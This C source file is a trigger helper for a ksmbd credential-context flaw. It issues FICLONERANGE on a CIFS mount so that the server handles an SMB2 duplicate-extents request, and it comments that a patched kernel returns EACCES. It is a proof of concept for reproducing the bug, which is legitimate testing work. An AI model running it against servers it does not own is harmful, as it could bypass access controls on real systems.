// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Trigger helper for the ksmbd FSCTL_DUPLICATE_EXTENTS_TO_FILE credential
 * context issue.
 *
 * Run this against a Linux CIFS mount backed by ksmbd.  The Linux CIFS client
 * translates FICLONERANGE on the destination file into the SMB2
 * FSCTL_DUPLICATE_EXTENTS_TO_FILE request handled by ksmbd.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/fs.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [--pause] <src-on-cifs> <dst-on-cifs> [len [src_off [dst_off]]]\n"
		"\n"
		"  --pause  wait for Enter after opening both handles and before FICLONERANGE\n"
		"\n"
		"Example:\n"
		"  %s /mnt/ksmbd-poc/src.bin /mnt/ksmbd-poc/dst.bin 4096\n",
		prog, prog);
}

static uint64_t parse_u64(const char *s, const char *name)
{
	char *end = NULL;
	unsigned long long v;

	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	return (uint64_t)v;
}

static off_t file_size_or_die(int fd, const char *path)
{
	struct stat st;

	if (fstat(fd, &st) < 0) {
		fprintf(stderr, "fstat(%s): %s\n", path, strerror(errno));
		exit(1);
	}
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "%s is not a regular file\n", path);
		exit(1);
	}
	return st.st_size;
}

int main(int argc, char **argv)
{
	struct file_clone_range range;
	const char *src_path;
	const char *dst_path;
	uint64_t len;
	uint64_t src_off = 0;
	uint64_t dst_off = 0;
	int pause_before_ioctl = 0;
	int src_fd;
	int dst_fd;
	int argi = 1;
	off_t src_size;

	if (argc > 1 && strcmp(argv[1], "--pause") == 0) {
		pause_before_ioctl = 1;
		argi++;
	}

	if (argc - argi < 2 || argc - argi > 5) {
		usage(argv[0]);
		return 2;
	}

	src_path = argv[argi++];
	dst_path = argv[argi++];

	src_fd = open(src_path, O_RDONLY | O_CLOEXEC);
	if (src_fd < 0) {
		fprintf(stderr, "open source %s: %s\n", src_path, strerror(errno));
		return 1;
	}

	dst_fd = open(dst_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
	if (dst_fd < 0) {
		fprintf(stderr, "open destination %s: %s\n", dst_path, strerror(errno));
		close(src_fd);
		return 1;
	}

	src_size = file_size_or_die(src_fd, src_path);
	if (argc - argi >= 1)
		len = parse_u64(argv[argi++], "len");
	else
		len = (uint64_t)src_size;
	if (argc - argi >= 1)
		src_off = parse_u64(argv[argi++], "src_off");
	if (argc - argi >= 1)
		dst_off = parse_u64(argv[argi++], "dst_off");

	if (len == 0) {
		fprintf(stderr, "len must be non-zero\n");
		return 2;
	}
	if (src_off + len > (uint64_t)src_size) {
		fprintf(stderr,
			"requested range exceeds source size: src_size=%jd src_off=%" PRIu64 " len=%" PRIu64 "\n",
			(intmax_t)src_size, src_off, len);
		return 2;
	}

	if (pause_before_ioctl) {
		printf("opened source fd=%d and destination fd=%d; press Enter to issue FICLONERANGE...",
		       src_fd, dst_fd);
		fflush(stdout);
		(void)getchar();
	}

	memset(&range, 0, sizeof(range));
	range.src_fd = src_fd;
	range.src_offset = src_off;
	range.src_length = len;
	range.dest_offset = dst_off;

	printf("issuing FICLONERANGE: src=%s dst=%s src_off=%" PRIu64
	       " dst_off=%" PRIu64 " len=%" PRIu64 "\n",
	       src_path, dst_path, src_off, dst_off, len);

	if (ioctl(dst_fd, FICLONERANGE, &range) < 0) {
		int saved_errno = errno;

		fprintf(stderr, "FICLONERANGE failed: errno=%d (%s)\n",
			saved_errno, strerror(saved_errno));
		fprintf(stderr,
			"Notes: EOPNOTSUPP usually means the mounted server/share did not advertise duplicate extents or the backing filesystem cannot clone this range. EACCES on a fixed kernel with LSM policy is expected.\n");
		close(dst_fd);
		close(src_fd);
		return 1;
	}

	if (fsync(dst_fd) < 0)
		fprintf(stderr, "warning: fsync destination failed: %s\n", strerror(errno));

	printf("FICLONERANGE completed. Check destination content and the server-side trace output.\n");
	close(dst_fd);
	close(src_fd);
	return 0;
}
